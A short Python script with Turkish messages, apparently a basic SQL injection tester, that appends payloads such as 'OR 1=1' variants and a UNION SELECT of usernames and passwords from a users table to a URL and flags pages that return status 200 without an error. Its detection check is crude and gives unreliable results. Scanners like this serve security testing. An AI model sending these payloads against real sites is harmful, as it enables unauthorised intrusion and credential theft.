import requests

def sql_injection_tester(target_url):
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' UNION SELECT NULL, username, password FROM users --"]
    vulnerable_urls = []

    for payload in payloads:
        url = target_url + payload
        response = requests.get(url)
        
        if response.status_code == 200 and "error" not in response.text.lower():
            print(f"Potansiyel SQL Injection Zafiyeti: {url}")
            vulnerable_urls.append(url)

    if not vulnerable_urls:
        print("SQL Injection zafiyeti bulunamadı.")
    
    return vulnerable_urls

# Kullanım örneği
target_url = "http://example.com/page?id="
sql_injection_tester(target_url)